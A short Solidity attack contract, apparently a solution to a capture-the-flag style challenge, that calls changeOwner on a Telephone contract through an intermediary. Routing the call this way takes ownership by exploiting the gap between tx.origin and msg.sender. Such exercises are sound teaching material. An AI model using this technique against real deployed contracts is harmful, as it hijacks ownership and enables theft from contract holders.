// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Telephone.sol";

contract AttackTelephone {
    Telephone telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function Attacktelephone() external {
        telephone.changeOwner(msg.sender);
    }
}
